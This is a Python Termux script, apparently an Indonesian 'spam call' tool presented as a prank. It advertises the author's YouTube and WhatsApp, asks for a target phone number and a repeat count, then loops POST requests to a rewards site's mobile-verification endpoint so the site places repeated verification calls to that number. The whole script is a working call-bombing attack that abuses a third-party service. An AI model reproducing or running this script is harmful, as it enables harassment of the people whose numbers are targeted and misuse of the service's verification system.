# Mau gua Marshal kagak jadi
# suberk dlu sebelum ngambil
import os,sys,time,requests
from time import sleep

#mengetik otomatis
def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.02)

os.system('clear')
print ('\033[36;1mSubscribe yt ku ngab \033[37mIlhAm ProjeCt \033[36mok! :v')
os.system('termux-open-url https://youtube.com/channel/UCBNU0pIvB_I8ncI92dFYqEw')
sleep(5)
os.system('clear')
print ('\033[36;1mJoin juga NO \033[37;1mWA gua ngab :v')
os.system('xdg-open http://wa.me/+6285762473480')
sleep(3)
os.system('clear')
# Ubah Terserah kalian
print ("")
mengetik("\033[36;1m ███████╗██████╗  █████╗ ███╗   ███╗ \033[33;1m ╔██████╗ █████╗ ██╗     ██╗")
mengetik("\033[36;1m ██╔════╝██╔══██╗██╔══██╗████╗ ████║ \033[33;1m ██╔════╝██╔══██╗██║     ██║")
mengetik("\033[36;1m ███████╗██████╔╝███████║██╔████╔██║ \033[33;1m ██║     ███████║██║     ██║")
mengetik("\033[37;1m ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║ \033[37;1m ██║     ██╔══██║██║     ██║")
mengetik("\033[37;1m ███████║██║     ██║  ██║██║ ╚═╝ ██║ \033[37;1m ╚██████╗██║  ██║███████╗███████╗")
mengetik("\033[37;1m ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ \033[37;1m  ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝")
print ("")
mengetik("\033[33;1m╔════════════════════════════════════════════════╗")
mengetik("\033[33;1m║  \033[36;1m [•] Authour : I L H A M                      \033[33;1m ║")
mengetik("\033[33;1m║  \033[36;1m [•] gitHub  : https://github.com/IlhAmProject    \033[33;1m ")
mengetik("\033[33;1m║  \033[36;1m [•] Yotube  : https://youtube.com/channel/UCBNU0pIvB_I8ncI92dFYqEw                      \033[33;1m ")
mengetik("\033[33;1m╚════════════════════════════════════════════════╝")
print ("")
mengetik("\033[36;1m╔═══════════════════════════╗")
mengetik("\033[36;1m║\033[33;1m  GUNAKAN BUAT PRANK TEMEN\033[36;1m ║")
mengetik("\033[36;1m╚═══════════════════════════╝")
sleep(1)
# Jaggan di ubah sayang
print ("")
mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m PILIHAN Nomor \033[1;33m• \033[0m\033[1;30m]══════════════>")
print ("")
mengetik("\033[37m[\033[31m•\033[37m]\033[32m Contoh nomor\033[37m : \033[37m\033[33m8Xxx\033[33m")
nomor = input("\033[37m[\033[31m•\033[37m]\033[32m Nomor Target\033[32m \033[37m:\033[37m\033[33m ")
mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m MASUKAN JUMLAH \033[1;33m• \033[0m\033[1;30m]══════════════>")
jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam\033[37m :\033[37m\033[33m "))
mengetik("[setiap 3x spam ada jeda 15 menit ngab sabar ngab lu] ")
time.sleep(3)
print ("")
# Jaggan di ubah sayang ku
url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}
# Jaggan di ubah sayng
for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [â€¢] Status ~+> ",(send.json()["message"]))
